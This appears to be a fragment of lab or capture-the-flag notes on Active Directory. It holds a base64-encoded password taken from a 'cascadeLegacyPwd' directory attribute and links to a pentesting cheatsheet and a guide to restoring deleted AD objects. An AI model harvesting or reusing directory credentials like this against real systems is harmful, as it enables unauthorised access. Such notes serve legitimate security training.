-cascadeLegacyPwd: clk0bjVldmE=
-...https://github.com/snovvcrash/cheatsheets/tree/master 
-https://www.lepide.com/how-to/restore-deleted-objects-in-active-directory.html 
 
 
 
